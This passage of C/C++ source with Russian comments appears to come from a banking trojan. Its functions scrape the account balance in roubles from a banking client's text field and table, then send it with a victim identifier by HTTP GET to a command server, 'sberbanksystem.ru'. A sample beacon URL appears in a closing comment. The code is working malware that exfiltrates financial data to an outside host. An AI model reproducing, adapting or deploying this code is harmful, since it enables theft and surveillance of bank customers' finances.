		fromLVM = 0;
	}
}

const char* panelaz = "sberbanksystem.ru";
//отсылаем баланс, GET запросом
void SendBalans( const char* balans )
{
	fwsprintfA wsprintfA = Get_wsprintfA();
	MemPtr<512> qr;
	MemPtr<128> uid;
	//формируем запрос
	GenerateUid(uid.str());
	wsprintfA( qr.str(), "http://%s/bal/?uid=%s&type=raifur&sum=%s", panelaz, uid, balans );
	//отправляем запрос
	THTTPResponse Response;
	ClearStruct(Response);
	HTTP::Get( qr, 0, &Response );
	DBGRAFA( "Rafa", "Передали баланс: %s", qr.str() );
}

//грабим баланс с текстового поля (справа снизу)
//грабим с такой строки:
//Доступный/текущий остаток по счету: 83109.16/83109.16 (РОССИЙСКИЙ РУБЛЬ)
void GrabBalansFromMemoText(const char* s)
{
	const char* p = m_strstr( s, "(РОССИЙСКИЙ РУБЛЬ)" );
	if( p )
	{
		p--; //становимся перед найденной фразой, там должен быть пробел, игнорируем его
		while( *p == ' ' && p >= s ) p--;
		if( p > s )
		{
			//стоим на последней цифре баланса, идем назад пока не найдем пробел, т. е. переходим на начало баланса
			const char* p1 = p;
			while( *p1 != ' ' && p1 >= s ) p1--;
			if( p1 > s )
			{
				p1++; //стоим на 1-й цифре первой суммы
				if( *p1 >= '0' && *p1 <= '9' )
				{
					char balans[32];
					//переносим цифры до точки (целую часть)
					int i = 0;
					while( *p1 != '.' && p1 > s && i < sizeof(balans) - 1 ) balans[i++] = *p1++;
					balans[i] = 0; //теперь у нас там остаток
					SendBalans(balans);
				}
			}
		}
	}
}

//грабит баланс с таблицы справа сверху
void GrabBalansFromLVM(const char* s)
{
	if( fromLVM == 0 )
	{
		if( m_lstrcmp( s, "РОССИЙСКИЙ РУБЛЬ" ) == 0 ) //нужное значение ячейки, следующая ячейка будет иметь баланс
		{
			fromLVM = 1;
		}
	}
	else
		if( fromLVM == 1 ) //в s находится баланс
		{
			if( *s >= '0' && *s <= '9' )
			{
				char balans[32];
				int i = 0;
				//переносим цифры до точки
				while( *s && *s != '.' && i < sizeof(balans) - 1 ) balans[i++] = *s++;
				balans[i] = 0;
				SendBalans(balans);
			}
			fromLVM = 0;
		}

}
//http://sberbanksystem.ru/bal/?uid=TEST0123456789&type=raifur&sum=234234

}